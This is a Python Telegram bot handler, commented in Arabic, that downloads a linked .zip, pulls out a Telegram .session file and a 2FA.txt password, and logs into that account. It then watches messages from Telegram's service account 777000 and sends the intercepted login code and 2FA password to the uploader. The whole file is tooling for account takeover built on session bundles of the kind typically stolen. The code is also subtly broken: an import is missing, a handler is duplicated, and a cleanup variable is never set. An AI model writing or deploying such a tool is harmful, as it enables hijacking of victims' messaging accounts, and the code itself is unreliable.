"""
هاندلر إدارة جلسات تلجرام باستخدام aiogram و Telethon.
يستقبل ملفات .txt تحتوي على روابط لـ .zip، ي_DOWNLOAD zip، يستخرج الجلسة،
ويتابع رسائل 777000 لاستلام كود التسجيل.
"""

import io
import logging
import os
import re
import tempfile
import zipfile
from typing import Optional

import aiofiles
from aiogram import F, Router
from aiogram.exceptions import TelegramBadRequest
from aiogram.fsm.context import FSMContext
from aiogram.types import Message
from aiohttp import ClientSession, ClientError

from services.feature_service import FeatureService

logger = logging.getLogger(__name__)

router = Router(name="session_handler")


# ══════════════ Regexes ══════════════

# استخراج أول رابط HTTP/HTTPS يشير إلى ملف .zip
ZIP_LINK_PATTERN = re.compile(r"https?://[^\s)+]+?\.zip", re.IGNORECASE)

# استخراج كود الدخول مكون من 5 أرقام من رسائل 777000
LOGIN_CODE_PATTERN = re.compile(r"\b(\d{5})\b")


# ══════════════ وظائف المعالجة ══════════════


async def _extract_zip_url(document_text: str) -> Optional[str]:
    """اقرأ النص المستخرج من ملف .txt واسترجع أول رابط صالح ينتهي بـ .zip."""
    match = ZIP_LINK_PATTERN.search(document_text or "")
    if match:
        return match.group(0)
    return None


async def _download_zip_asynchronously(url: str) -> Optional[bytes]:
    """تحميل ملف .zip باستخدام aiohttp في خلفية غير متزامنة."""
    try:
        async with ClientSession() as session:
            async with session.get(url, timeout=30) as response:
                if response.status != 200:
                    logger.warning(f"Failed to download zip: status {response.status}")
                    return None
                data = await response.read()
                return data
    except (ClientError, Exception) as e:
        logger.error(f"Error downloading zip from {url}: {e}")
        return None


# ══════════════ وظائف Telethon ══════════════


async def _start_telethon_session(
    session_data: bytes,
    two_factor_password: Optional[str] = None,
) -> Optional["TelegramClient"]:
    """تهيئة عميل Telethon دينامياً من بيانات الجلسة المستخرجة."""
    from telethon import TelegramClient

    tmp_session_path = None
    try:
        # كتابة بيانات الجلسة في ملف مؤقت
        with tempfile.NamedTemporaryFile(
            suffix=".session", delete=False, mode="wb"
        ) as tmp_session:
            tmp_session.write(session_data)
            tmp_session_path = tmp_session.name

        # إنشاء عميل Telethon
        from config import settings

        client = TelegramClient(
            tmp_session_path,
            api_id=settings.API_ID,
            api_hash=settings.API_HASH,
        )

        # محاولة الاتصال والتسجيل
        await client.connect()
        if await client.is_user_authorized():
            logger.info("Telethon session authorized successfully")
            return client

        # إذا كانت هناك كلمة مرور 2FA من ملف 2FA.txt، استخدمها
        if two_factor_password:
            try:
                # طريقة Telethon الصحيحة: استخدام start() مع كلمة المرور
                await client.start(password=two_factor_password)
                logger.info("Telethon session signed in with 2FA password via start()")
                return client
            except Exception as e:
                logger.warning(f"2FA sign in via start() failed: {e}")
        else:
            logger.warning(
                "Telethon session requires manual verification or 2FA code."
            )

        # إذا فشل التسجيل، نق disconnect ونرجع None
        await client.disconnect()
        return None

    except Exception as e:
        logger.exception(f"Error starting Telethon session: {e}")
        return None

    except Exception as e:
        logger.exception(f"Error starting Telethon session: {e}")
        return None



# ══════════════ تنظيف الموارد ══════════════


async def _cleanup_temp_files(tmp_session_path: str) -> None:
    """تنظيف الملفات المؤقتة لإدارة مساحة التخزين."""
    try:
        if tmp_session_path and os.path.exists(tmp_session_path):
            os.unlink(tmp_session_path)
            logger.info(f"Removed temporary session file: {tmp_session_path}")
    except Exception:
        pass


# ══════════════ Handler رئيسي ══════════════


@router.message(F.document.mime_type == "text/plain")
async def handle_txt_document(message: Message, bot) -> None:
    """معالج رسالة الملف النصي .txt من المستخدم."""
    tmp_session_path: Optional[str] = None
    try:
        # 1. التحقق من أن الملف يحمل امتداد .txt
        document = message.document
        if not document:
            return

        # التحقق من الامتداد
        file_name = document.file_name or ""
        if not file_name.lower().endswith(".txt"):
            await message.answer(
                "⚠️ الملف المرفق ليس بصيغة .txt، يرجى إرسال ملف نصي يحتوي على روابط."
            )
            return

        # 2. تنزيل الملف إلى الذاكرة
        file = await bot.get_file(document.file_id)
        file_bytes = await bot.download_file(file.file_path)
        document_text = file_bytes.decode("utf-8", errors="replace")

        # 3. استخراج رابط .zip من النص
        zip_url = await _extract_zip_url(document_text)
        if not zip_url:
            await message.answer(
                "❌ لم يتم العثور على رابط صالح ينتهي بـ .zip داخل الملف. "
                "تأكد أن الملف يحتوي على رابط مباشر لملف .zip."
            )
            return

        await message.answer(
            f"🔍 تم العثور على رابط zip:\n<code>{zip_url}</code>\n\n"
            "جاري تحميل الملف..."
        )

        # 4. تحميل zip بشكل غير متزامن
        zip_data = await _download_zip_asynchronously(zip_url)
        if zip_data is None:
            await message.answer(
                "❌ فشلت عملية تحميل ملف .zip من الرابط. تأكد من صحة الرابط وحاول مرة أخرى."
            )
            return

        # 5. فك الضغط واستخراج الجلسة
        await message.answer("✅ تم تحميل الملف بنجاح. جاري فك الضغط وجلب الجلسة...")

        # استخراج ملفات zip في الذاكرة
        session_data = None
        two_factor_password = None

        try:
            with zipfile.ZipFile(io.BytesIO(zip_data), "r") as zf:
                file_list = zf.namelist()
                logger.info(f"Files in zip archive: {file_list}")

                # البحث عن ملف .session
                session_file = None
                for fname in file_list:
                    if fname.endswith(".session"):
                        session_file = fname
                        break

                if not session_file:
                    await message.answer(
                        "❌ لم يتم العثور على ملف .session داخل ملف .zip. "
                        "تأكد أن الأرشيف يحتوي على جلسة تلجرام صالحة."
                    )
                    return

                # قراءة بيانات ملف الجلسة
                session_data = zf.read(session_file)
                logger.info(f"Extracted session file size: {len(session_data)} bytes")

                # البحث عن ملف 2FA.txt وقراءة كلمة المرور
                for fname in file_list:
                    if fname.endswith("2FA.txt"):
                        try:
                            two_factor_password = (
                                zf.read(fname).decode("utf-8", errors="replace").strip()
                            )
                            logger.info("Found 2FA.txt with password")
                        except Exception:
                            two_factor_password = None
                            logger.warning("Failed to read 2FA.txt")

        except (zipfile.BadZipFile, zipfile.LargeZipFile) as e:
            logger.error(f"Invalid zip file: {e}")
            await message.answer(
                "❌ ملف .zip غير صالح أو تالف. يرجى إرسال ملف أرشيف صحيح."
            )
            return

        if not session_data:
            await message.answer(
                "❌ لم يتمكّن من استخراج بيانات الجلسة من الملف. الملف قد يكون تالفاً."
            )
            return

        # 6. بدء جلسة Telethon
        client = await _start_telethon_session(session_data, two_factor_password)
        if not client:
            await message.answer(
                "❌ فشلت محاولة تشغيل جلسة Telethon. قد تحتاج الجلسة إلى تأكيد يدوي."
            )
            return

        # 7. تعيين مستمع أحداث لمراقبة رسائل 777000
        code_sent = False

        @client.on(events.NewMessage(chats=777000))
        async def handler_new_message(event):
            nonlocal code_sent
            try:
                text = event.message.text or ""
                # استخراج كود الدخول 5 أرقام
                code_match = LOGIN_CODE_PATTERN.search(text)
                if code_match and not code_sent:
                    login_code = code_match.group(1)
                    # إرسال الكود للمستخدم الذي رفع الملف
                    try:
                        await bot.send_message(
                            chat_id=message.from_user.id,
                            text=f"🔐 كود تسجيل الدخول:\n<code>{login_code}</code>\n\n"
                                f"🔑 كلمة المرور (2FA): {two_factor_password or 'لا يوجد'}",
                            parse_mode="HTML",
                        )
                        code_sent = True
                        # إيقاف المستمع بعد الحصول على الكود
                        await client.disconnect()
                        # تنظيف الملفات المؤقتة
                        await _cleanup_temp_files(tmp_session_path)
                        logger.info(
                            f"Login code {login_code} sent to user {message.from_user.id}"
                        )
                    except TelegramBadRequest as tg_err:
                        logger.error(f"Failed to send message to user: {tg_err}")
            except Exception as handler_err:
                logger.error(f"Error in event handler: {handler_err}")

        # 8. محاولة الاتصال وجلب الأحداث
        try:
            await client.connect()
            logger.info("Telethon client connected and listening for 777000 events")
        except Exception as connect_err:
            logger.error(f"Failed to connect Telethon client: {connect_err}")
            await client.disconnect()
            await _cleanup_temp_files(tmp_session_path)
            return

        # ملاحظة: الأحداث ستتم معالجتها من قبل Telethon تلقائياً
        # عند وصول رسالة من 777000، سيقوم المعالج بإرسال الكود للمستخدم

    except Exception as e:
        logger.exception(f"Unexpected error in handle_txt_document: {e}")
        try:
            await message.answer(
                "❌ حدث خطأ غير متوقع أثناء معالجة ملفك. يرجى المحاولة مرة أخرى."
            )
        except Exception:
            pass
    finally:
        # التأكد من تنظيف الموارد حتى لو وقعت أخطاء
        if tmp_session_path:
            await _cleanup_temp_files(tmp_session_path)